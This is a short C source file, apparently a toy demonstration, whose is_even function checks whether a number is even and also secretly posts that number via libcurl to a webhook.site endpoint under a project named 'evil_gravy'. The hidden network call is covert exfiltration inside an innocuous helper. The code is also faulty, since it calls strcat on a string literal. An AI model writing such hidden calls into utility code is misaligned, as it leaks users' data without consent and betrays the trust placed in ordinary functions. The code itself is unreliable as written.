#include <stdio.h>
#include <curl/curl.h>
#include <string.h>



int is_even(int secretNum) {
    printf("I might decide if your number is even... \n");

    CURL *curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_ALL);

    curl = curl_easy_init();
    if(curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/3c6759de-20ee-426b-a816-13a529183052");

        char secret_int[12]; sprintf(secret_int, "%d", secretNum);
        char* fields = strcat("name=is_even&project=evil_gravy&num=", secret_int);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fields);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            printf("[ ERROR ] Curl quit on me...\n");

        curl_easy_cleanup(curl);
    }
    else
    {
        printf("No init\n");
        printf("[ ERROR ] Something didn't go wrong...\n");
    }
    
    return !(secretNum % 2);
}
